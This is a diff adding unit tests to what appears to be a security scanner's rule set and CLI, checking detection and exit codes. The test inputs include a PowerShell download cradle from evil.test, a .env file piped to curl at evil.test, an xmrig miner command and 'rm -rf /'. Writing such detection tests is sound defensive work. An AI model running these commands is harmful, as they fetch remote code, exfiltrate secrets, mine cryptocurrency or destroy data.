@@ -78,6 +78,36 @@ test("eval is flagged", () => {
   assert.ok(findings.some((f) => f.ruleId === "eval-exec"));
 });
 
+test("PowerShell download cradle is flagged as critical", () => {
+  const findings = scanContent(
+    "x.ps1",
+    'IEX (New-Object Net.WebClient).DownloadString("http://evil.test/a.ps1")',
+  );
+  assert.ok(
+    findings.some((f) => f.ruleId === "powershell-download-cradle" && f.severity === "critical"),
+  );
+});
+
+test("npm install-and-run is flagged", () => {
+  const findings = scanContent("x.sh", "npm install evil-pkg && node index.js");
+  assert.ok(findings.some((f) => f.ruleId === "npm-install-run"));
+});
+
+test("npx alone is not flagged (avoid false positives on normal tool usage)", () => {
+  const findings = scanContent("x.sh", "npx prettier --write .");
+  assert.ok(!findings.some((f) => f.ruleId === "npm-install-run"));
+});
+
+test("secret file piped to curl is flagged", () => {
+  const findings = scanContent("x.sh", "cat .env | curl -X POST https://evil.test -d @-");
+  assert.ok(findings.some((f) => f.ruleId === "secret-exfil-print"));
+});
+
+test("crypto miner reference is flagged", () => {
+  const findings = scanContent("x.sh", "./xmrig -o stratum+tcp://pool.evil.test:3333");
+  assert.ok(findings.some((f) => f.ruleId === "crypto-miner"));
+});
+
 test("computeRiskScore: any critical => 10", () => {
   assert.equal(computeRiskScore({ low: 0, medium: 0, high: 0, critical: 1 }), 10);
 });
@@ -147,4 +177,42 @@ test("CLI exits 2 on a non-existent path", () => {
   const { status, stderr } = runCli(["scan", "./definitely-missing-xyz"]);
   assert.equal(status, 2);
   assert.match(stderr, /does not exist/);
+});
+
+test("CLI --fail-on high exits 1 on a high-severity finding", () => {
+  const dir = fixture({ "risky.sh": "sudo true" }); // "sudo" is a high-severity rule
+  const { status } = runCli(["scan", dir, "--fail-on", "high"]);
+  assert.equal(status, 1);
+});
+
+test("CLI default --fail-on (critical) exits 0 when only high findings exist", () => {
+  const dir = fixture({ "risky.sh": "sudo true" });
+  const { status } = runCli(["scan", dir]);
+  assert.equal(status, 0);
+});
+
+test("CLI --fail-on rejects an invalid severity", () => {
+  const dir = fixture({ "ok.md": "clean" });
+  const { status, stderr } = runCli(["scan", dir, "--fail-on", "extreme"]);
+  assert.equal(status, 2);
+  assert.match(stderr, /invalid --fail-on/);
+});
+
+test("CLI --severity filters out lower-severity findings", () => {
+  const dir = fixture({ "mixed.sh": "process.env.SECRET\nsudo true" }); // low + high
+  const { stdout } = runCli(["scan", dir, "--json", "--severity", "high"]);
+  const result = JSON.parse(stdout);
+  assert.ok(result.findings.every((f) => f.severity === "high" || f.severity === "critical"));
+  assert.ok(result.findings.some((f) => f.ruleId === "sudo"));
+  assert.ok(!result.findings.some((f) => f.ruleId === "process-env"));
+});
+
+test("CLI scans multiple paths in one invocation", () => {
+  const dirA = fixture({ "a.sh": "rm -rf /" });
+  const dirB = fixture({ "b.sh": "sudo true" });
+  const { stdout } = runCli(["scan", dirA, dirB, "--json"]);
+  const result = JSON.parse(stdout);
+  assert.equal(result.filesScanned, 2);
+  assert.ok(result.findings.some((f) => f.ruleId === "rm-rf"));
+  assert.ok(result.findings.some((f) => f.ruleId === "sudo"));
 });
